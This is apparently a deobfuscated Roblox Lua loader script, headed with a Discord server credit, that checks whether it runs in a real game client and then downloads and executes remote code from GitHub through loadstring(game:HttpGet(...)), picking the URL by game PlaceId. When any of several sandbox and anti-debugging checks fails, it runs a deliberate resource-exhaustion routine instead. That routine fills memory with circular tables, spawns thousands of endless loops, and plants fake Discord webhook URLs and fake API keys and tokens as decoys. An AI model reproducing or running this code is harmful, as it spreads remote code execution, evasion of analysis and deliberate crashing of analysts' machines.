-- This file was generated at discord.gg/syncrypt

local function v2()
	print("nt")

	local function v3(p1, p2)
		local n1 = 0
		local s1 = ""

		while true do
			n1 = n1 + 1

			if n1 > p1 then
				break
			end

			local v6 = math.random(1, #p2)

			s1 = s1 .. p2:sub(v6, v6)
		end

		return s1
	end

	for _ = 1, 1000 do
		local v8 = v3(19, "0123456789")
		local v9 = v3(68, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")

		print("https://discord.com/api/webhooks/" .. v8 .. "/" .. v9)
	end

	local function v10(p3)
		return v3(p3, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_")
	end

	local v11 = nil

	v11 = function(p4, p5, p6)
		if p5 <= p4 then
			local self_ = {}

			self_.self = self_
			self_.loop = {
				self_,
				self_,
				self_,
				self_,
				self_
			}

			return self_
		else
			local self_ = p6 or {}

			for i = 1, 50 do
				self_[i] = v11(p4 + 1, p5)
				self_[v10(15)] = {
					ref = self_,
					data = string.rep(v10(10), 500),
					circular = self_
				}
			end

			self_.self = self_
			self_.parent = self_

			return self_
		end
	end

	local v15 = v11

	for _ = 1, 500 do
		_G[v10(30)] = v15(0, 8)
	end

	local function v17(p7, p8)
		local v18 = p7 or 0
		local v19 = p8 or 1

		string.rep(v10(20), 200)

		if not (v19 < 5) then
			return v17(v18 + 1, v19)
		end

		spawn(function()
			v17(v18 + 1, v19 + 1)
		end)

		return v17(v18 + 1, v19)
	end

	local v20 = v17

	local function v21()
		local t2 = {}

		for i = 1, 100 do
			local t3 = {}
			local _ = i
			local v26 = t3

			for i2 = 1, 1000 do
				local rep = string.rep
				local random = math.random
				local child = {
					id = i2,
					chain = i,
					data = rep(tostring(random()), 500),
					junk = string.rep(v10(30), 100),
					parent = t3,
					circular = { t3, v26, t3 }
				}

				t3.child = child
				t3.ref = v26
				t3[v10(20)] = v15(0, 6)
				t3 = child
			end

			t2[i] = v26
		end

		return t2
	end

	for _ = 1, 2000 do
		local self_ = {}

		self_.self = self_
		self_.ref = { self_, self_, self_ }

		for i = 1, 100 do
			self_[i] = {
				data = string.rep(v10(20), 200),
				circular = self_
			}
		end

		_G[v10(25)] = self_
	end

	for _ = 1, 1000 do
		_G[v10(30)] = {
			API_KEY = v10(64),
			SECRET = v10(128),
			WEBHOOK = "https://discord.com/api/webhooks/" .. v3(19, "0123456789") .. "/" .. v3(68, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"),
			ENDPOINT = "https://api." .. v10(10) .. ".com/v" .. math.random(1, 9),
			TOKEN = v10(256),
			nested = {
				self = {},
				loop = {}
			}
		}
		_G[v10(30)].nested.self = _G[v10(30)]
		_G[v10(30)].nested.loop = { _G[v10(30)], _G[v10(30)] }
	end

	local function v35()
		local t4 = {
			__index = function(_, _)
				return v15(0, 6)
			end,
			__newindex = function(p9, p10, _)
				local v37 = v15

				rawset(p9, p10, v37(0, 6))
				rawset(p9, v10(20), v15(0, 6))
			end,
			__tostring = function()
				return v20()
			end,
			__concat = function(_, _)
				return v15(0, 6)
			end,
			__call = function()
				return v20()
			end,
			__len = function()
				return v20()
			end,
			__pairs = function()
				return function()
					return v15(0, 6)
				end
			end
		}

		for _ = 1, 1000 do
			local obj = setmetatable({}, t4)

			_G[v10(35)] = obj
		end
	end
	local function v40()
		for _ = 1, 10000 do
			local function v42()
				local v43 = v15(0, 5)

				while true do
					v43[v10(10)] = v15(0, 5)
					task.wait()
				end
			end

			spawn(v42)
		end
	end

	for _ = 1, 500 do
		_G[v10(40)] = string.rep(v10(100), 5000)
	end

	local function v45()
		local t5 = {}

		for i = 1, 5000 do
			t5[i] = function()
				return v15(0, 5)
			end
			_G[v10(28)] = t5[i]
		end

		for i = 1, #t5 do
			local min = math.min
			local v50 = #t5
			local v51 = i

			for i2 = 1, min(i + 100, v50) do
				t5[v51][v10(12)] = t5[i2]
			end
		end
	end
	local function v53()
		for _ = 1, 2000 do
			_G[v10(32)] = newproxy(true)
		end
	end

	for _ = 1, 500 do
		local obj = setmetatable({}, {
			__mode = "kv"
		})
		local self_ = {}

		self_.self = self_

		for _ = 1, 50 do
			obj[{}] = self_
		end

		_G[v10(26)] = obj
	end

	spawn(v21)
	spawn(v35)
	spawn(v40)
	spawn(v45)
	spawn(v53)

	for _ = 1, 10 do
		spawn(function()
			pcall(v20)
		end)
	end

	spawn(function()
		while true do
			local self_ = {}

			self_.self = self_
			self_.data = string.rep(v10(50), 1000)
			_G[v10(45)] = self_
			task.wait(0.001)
		end
	end)

	return true
end

local game_ = game
local v62 = type(game_) ~= "userdata"

if not v62 then
	local game_2 = game

	v62 = typeof(game_2) ~= "Instance"
end

if v62 and v2() then
	return
end

local ok, result = pcall(game.GetService, game, "Players")
local t1 = {
	value2 = ok
}
local ok2, value3 = pcall(game.GetService, game, "RunService")

t1.value1 = ok2
t1.value3 = value3

if not (t1.value2 and t1.value1) and v2() then
	return
end

if not (t1.value3:IsClient() or not v2()) then
	return
end

local LocalPlayer = result.LocalPlayer

if (not LocalPlayer or typeof(LocalPlayer) ~= "Instance") and v2() then
	return
end

local v69 = not LocalPlayer.Parent

if not v69 then
	local Parent = LocalPlayer.Parent

	v69 = typeof(Parent) ~= "Instance"
end

if v69 and v2() then
	return
end

local Name = LocalPlayer.Name

if (type(Name) ~= "string" and true or #Name < 1) and v2() then
	return
end

local now = os.clock()

task.wait()

if os.clock() - now <= 0 and v2() then
	return
end

local workspace_ = workspace

if not (typeof(workspace_) == "Instance" or not v2()) then
	return
end

if tostring({}):sub(8, 15) == tostring({}):sub(8, 15) and v2() then
	return
end

local print_ = print

task.wait()

if not (print == print_ or not v2()) then
	return
end

t1.value2 = game

if t1.value2.PlaceId == 109983668079237 then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/test/refs/heads/main/s"))()

	return
end

t1.value2 = game

if t1.value2.PlaceId == 142823291 then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/test/refs/heads/main/m"))()

	return
end

t1.value2 = game

if t1.value2.PlaceId ~= 920587237 then
	return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/test/refs/heads/main/a"))()
